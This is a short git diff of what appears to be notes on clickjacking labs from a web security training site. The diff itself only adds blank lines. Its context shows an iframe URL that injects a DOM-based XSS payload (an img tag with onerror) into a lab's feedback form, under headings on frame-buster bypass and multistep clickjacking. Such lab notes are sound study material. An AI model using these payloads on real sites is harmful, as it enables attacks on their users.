@@ -50,6 +50,7 @@ div {
 </iframe>
 ```
 
+
 # Busting Frame Buster
 ```html
 <style>
@@ -80,6 +81,7 @@ div {
 </iframe>
 ```
 
+
 # Exploiting clickjacking vulnerability to trigger DOM-based XSS
 ```html
 <style>
@@ -104,6 +106,7 @@ div {
 <iframe src="https://0a7f0029042405a1804730750088006f.web-security-academy.net/feedback?name=%3cimg+src%3dx+onerror%3dprint()%3e&email=test%40test.com&subject=test&message=test#feedbackResult">
 </iframe>
 ```
+
 
 # Lab: Multistep clickjacking
 ```html
